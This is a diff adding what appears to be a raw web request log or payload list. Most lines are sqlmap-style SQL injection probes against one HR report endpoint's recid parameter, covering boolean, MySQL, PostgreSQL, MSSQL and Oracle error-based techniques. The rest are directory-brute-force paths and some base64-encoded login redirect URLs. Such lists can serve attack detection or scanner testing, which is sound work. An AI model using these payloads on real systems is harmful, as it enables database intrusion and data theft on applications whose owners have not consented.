@@ -1,0 +1,48 @@
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533') AND 5156=5156 AND ('JDfx'='JDfx
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533') AND 1420=1394 AND ('KPMv'='KPMv
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND 3402=6132 AND 'SHVD'='SHVD
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND 5156=5156 AND 'GHWw'='GHWw
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND 5202=8783 AND 'vEiA'='vEiA
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%' AND 6112=1416 AND '%'='
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%' AND 5156=5156 AND '%'='
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%' AND 6390=8208 AND '%'='
+/learn-php/
+/sunsmavs_6/
+/127465/
+/158961/
+/encryption primer/
+/whores/
+/162959/
+/javascript/pt.jpg
+/landing_template/
+/dualdisc/
+/customerssupport/
+/javascript/foundation.bak
+/1613507851457d13c035b6e/
+/javascript/iissamples.php3
+/xairon_v2/
+/dragon-sunglasses/
+/currentstudies/
+/emifile2379/
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533') AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x3a7963643a,(SELECT (CASE WHEN (8692=8692) THEN 1 ELSE 0 END)),0x3a786d793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('qoyj'='qoyj
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x3a7963643a,(SELECT (CASE WHEN (8692=8692) THEN 1 ELSE 0 END)),0x3a786d793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'YCdI'='YCdI
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%' AND (SELECT 8692 FROM(SELECT COUNT(*),CONCAT(0x3a7963643a,(SELECT (CASE WHEN (8692=8692) THEN 1 ELSE 0 END)),0x3a786d793a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533') AND 8173=CAST((CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (8173=8173) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)) AS NUMERIC) AND ('Szit'='Szit
+uri=L3NreXBlYXJsL2NuL2ludGVncmFscXVlcnkuYWN0aW9uP05YWFM9MTQ5NzYzMDA3Ng==
+/skypearl/cn/validatorAction.action?d=1497657456
+/skypearl/cn/validatorAction.action?d=1497650416
+/skypearl/cn/validatorAction.action?d=1497648949
+/skypearl/cn/loginPage.action?uri=L3NreXBlYXJsL2NuL3NreXBlYXJsY29ubmVjdGluZm8uYWN0aW9uP05YWFM9MTQ5NzY1MDYxMQ==
+/skypearl/cn/validatorAction.action?d=1497639531
+/skypearl/cn/validatorAction.action?d=1497656501
+/skypearl/cn/loginPage.action?uri=L3NreXBlYXJsL2NuL2ludGVncmFscXVlcnkuYWN0aW9uP05YWFM9MTQ5NzYzMTI1MQ==
+/skypearl/cn/validatorAction.action?d=1497657304
+/skypearl/cn/validatorAction.action?d=1497630338673
+/skypearl/cn/validatorAction.action?d=1497633730
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND 8173=CAST((CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (8173=8173) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)) AS NUMERIC) AND 'Dnmi'='Dnmi
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%' AND 8173=CAST((CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (8173=8173) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)) AS NUMERIC) AND '%'='
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533') AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58))) AND ('QtUf'='QtUf
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58))) AND 'Tvgv'='Tvgv
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533%' AND 9038=CONVERT(INT,(CHAR(58)+CHAR(121)+CHAR(99)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (9038=9038) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(120)+CHAR(109)+CHAR(121)+CHAR(58))) AND '%'='
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533') AND 1762=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (1762=1762) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)||CHR(62))) FROM DUAL) AND ('bonR'='bonR
+/hr3/personnel/lzh/LzhReportEdit.aspx	recid=101533' AND 1762=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(121)||CHR(99)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (1762=1762) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(120)||CHR(109)||CHR(121)||CHR(58)||CHR(62))) FROM DUAL) AND 'Rqkx'='Rqkx
